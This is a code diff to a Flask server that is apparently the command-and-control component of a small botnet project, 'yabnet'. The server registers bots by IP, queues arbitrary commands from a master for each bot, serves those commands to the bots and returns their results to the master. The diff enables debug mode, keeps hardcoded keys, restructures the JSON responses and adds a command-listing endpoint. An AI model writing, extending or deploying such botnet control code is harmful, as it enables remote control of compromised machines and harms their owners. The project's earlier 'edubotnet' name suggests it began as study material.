@@ -4,20 +4,29 @@ from datetime import datetime
 
 from models import Bot
 from models import Command
+from models import db 
 
 app = Flask(__name__)
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///edubotnet.sqlite3'
-db = SQLAlchemy(app)
+app.config['DEBUG'] = True
+app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///yabnet.sqlite3'
+db.app = app
+db.init_app(app)
 
-FIRSTCONTACTKEY = 'firstcontact'
+FIRSTCONTACTKEY = 'firstcontactkey'
 # TODO: Change the register key to change dynamically 
 REGISTERKEY = 'registerkey'
 MASTERKEY = 'masterkey'
 
+"""
+TODO: Add "lastcheckin" in Bot. Upon master's "list" command, 
+go through all the Bots and remove all the bots which did not checkin
+for 5 cycles 
+"""
 
 def init_db():
     db.drop_all()
     db.create_all()
+    db.session.commit()
 
 @app.route('/')
 def hello_world():
@@ -87,9 +96,9 @@ def register():
         if bot_os is None:
             return jsonify({'error': 'os is required'})
 
-        print ("[DEBUG] registerkey = ", registerkey)
-        print ("[DEBUG] ip = ", bot_ip)
-        print ("[DEBUG] os = ", bot_os)
+        #print ("[DEBUG] registerkey = ", registerkey)
+        #print ("[DEBUG] ip = ", bot_ip)
+        #print ("[DEBUG] os = ", bot_os)
         
         try:
             """
@@ -134,9 +143,10 @@ def botpush(bot_ip):
     masterkey = data['masterkey']
     cmd = data['cmd']
 
-    print("[DEBUG] masterkey = ", masterkey)
-    print("[DEBUG] cmd = ", cmd)
-    print("[DEBUG] bot_ip = ", bot_ip)
+    #print("[DEBUG] masterkey = ", masterkey)
+    #print("[DEBUG] bot_ip = ", bot_ip)
+    #print("[DEBUG] cmd = ", cmd)
+    
 
 
     try:
@@ -205,11 +215,11 @@ def bottask(bot_ip):
         except Exception as e:
             return jsonify({'error': 'There are no commands available'})
 
-        return command.cmd
+        return jsonify({ 'command': command.cmd })
 
 
     except Exception as e:
-        return str(e) 
+        return jsonify({ 'error': str(e) }) 
 
 # TODO: Will need a lot of debugging for this one (I think) 
 @app.route('/bot/<bot_ip>/result', methods=['POST'])
@@ -245,17 +255,23 @@ def botresult(bot_ip):
                 db.session.commit()
                 
                 # This needs to be changed 
-                return result
+                #return result
+                return '' 
 
         # If a master is visiting the endpoint, return the result to the master 
         elif 'masterkey' in data:
             try:
                 query_bot = Bot.query.filter_by(ip=bot_ip).first()
-                command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
+                print("[DEBUG1]", query_bot)
+                #command = Command.query.filter_by(bot_id=query_bot.id).order_by(Command.id.desc()).first()
+                #command = Command.query.filter_by(bot_id=query_bot.id).first()
+                command = Command.query.filter_by(bot_ip=bot_ip).order_by(Command.id.desc()).first()
                 result = command.result
 
+                print("[DEBUG2]", command)
+
                 if result is None:
-                    return jsonify({'error': 'No command as of now.'})
+                    return jsonify({'error': 'Bot have not called back'})
                 else:
                     return result 
 
@@ -283,6 +299,19 @@ def botlist():
     #print(type(botlist))
 
     return result
+
+@app.route('/bot/commands', methods=['GET'])
+def commandlist():
+    commandlist = Command.query.all()
+
+    result = ''
+
+    for command in commandlist:
+        print("[DEBUG] result = ", command.result)
+        print("[DEBUG] command's bot_id = ", command.bot_id)
+        #result += command.get_info() + '\n'
+
+    return result 
 
 
 init_db()
